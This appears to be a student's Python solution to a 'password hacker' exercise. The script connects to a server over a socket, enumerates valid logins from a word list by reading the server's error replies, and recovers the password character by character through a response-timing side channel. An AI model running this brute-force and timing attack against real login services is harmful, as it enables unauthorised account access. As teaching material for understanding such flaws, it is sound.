# write your code here
import socket
import sys
import itertools
import string
import json
from datetime import datetime, timedelta

characters = string.digits + string.ascii_letters
answers = []
d = {}
correct_pass = ''
#password_list = []
correct_login = ' '
new_char = ''
with open('logins.txt', 'r') as login_file:
    login_list = [line.rstrip('\n') for line in login_file]


def generate_password(n=''):
    password_list = []
    for character in characters:
        s = n+character
        password_list.append(s)
    return password_list


def generate_message(login, password=' '):
    message = {
        "login": login,
        "password": password
    }
    return message


def generate_string():
    pass


def new_socket():
    global correct_login
    with socket.socket() as client_socket:
        hostname = sys.argv[1]
        port = int(sys.argv[2])
        address = (hostname, port)
        #client_socket.bind(address)
        client_socket.connect(address)


        generated_pass = None

        #print(generate_password(new_char))

        for login in login_list:
            json_string = json.dumps(generate_message(login))
            client_socket.send(json_string.encode('utf-8'))
            response = client_socket.recv(1024).decode('utf-8')
            parsed_data = json.loads(response)
            if parsed_data.get('result') == 'Connection success!':
                pass
            elif parsed_data.get('result') == 'Wrong login!':
                pass
            elif parsed_data.get('result') == 'Wrong password!':
                correct_login = generate_message(login).get("login")
            elif parsed_data.get('result') == 'Exception happened during login':
                pass
        get_password(client_socket)


def get_password(client_socket):
    global new_char
    for password in generate_password(new_char):
        json_string = json.dumps(generate_message(correct_login, password))
        client_socket.send(json_string.encode('utf-8'))
        start = datetime.now()
        response = client_socket.recv(1024).decode('utf-8')
        finish = datetime.now()
        difference = finish - start
        #print(difference)
        parsed_data = json.loads(response)
        #print(json_string)
        #print(parsed_data)
        if parsed_data.get('result') == 'Connection success!':
            print(json_string)
            exit()
        elif parsed_data.get('result') == 'Wrong login!':
            pass
        #elif parsed_data.get('result') == 'Wrong password!':
        #    pass
            #correct_login = generate_message(login).get("login")
        elif difference > timedelta(milliseconds=100):
            new_char = generate_message(correct_login, password).get('password')
            #print(True)
            get_password(client_socket)





new_socket()
